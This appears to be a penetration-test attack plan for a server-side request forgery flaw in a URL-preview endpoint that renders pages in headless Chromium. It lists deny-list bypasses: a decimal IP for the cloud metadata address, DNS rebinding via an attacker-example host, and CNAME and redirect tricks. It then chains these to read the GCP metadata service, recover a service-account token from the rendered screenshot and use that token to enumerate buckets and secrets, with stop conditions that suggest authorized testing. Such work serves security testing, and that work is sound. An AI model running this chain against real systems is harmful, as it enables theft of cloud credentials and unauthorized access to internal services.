primitive: POST /api/v1/preview accepts a user-supplied url and renders it via headless Chromium, returning a screenshot URL.

bypass_techniques.evidence: Deny-list matches dotted-quad strings; decimal IP 2852039166 resolves to 169.254.169.254 but is not blocked.
Headless Chromium follows fresh DNS for sub-resources after the initial allow check.
bypass_techniques.test_payload: https://rebind.attacker.example.com/  (A records flip 1.1.1.1 -> 169.254.169.254 on second lookup)

bypass_techniques.evidence: Regex allows any host matching [a-z0-9.-]+; an attacker domain CNAMEd to metadata.google.internal passes the regex while resolving internally.
Headless browser follows 30x redirects; only the initial URL is filtered.

internal_targets.expected_signal: Screenshot containing JSON with access_token / expires_in keys, or a network log showing a 200 from this host.
Screenshot showing nested JSON tree of project_id, network interfaces, attached service accounts.
401/403 with Kubernetes-style error JSON proves egress to cluster API; pivot from there.

chain: Confirm SSRF reach by sending url=https://burpcollaborator.<id>.oastify.com and watching for an HTTP hit.
Bypass deny-list with decimal IP payload; if blocked, swap to attacker-controlled CNAME pointing at metadata.google.internal.
Render http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true&alt=json with the GCP-required Metadata-Flavor header injected via redirect target.
Pull screenshot URL from /api/v1/preview response and OCR it (or scrape the cdn.example.com PNG) to recover the service-account token.
Use the SA token against the GCP API to enumerate buckets/secrets reachable from this VM.
stop_conditions: Any 200 response from a 169.254.169.254 / metadata.google.internal request is a confirmed cloud-metadata SSRF — stop testing and report.
Recovery of a real service-account access_token is the end state — do not exercise the token beyond a single read-only listProjects call.
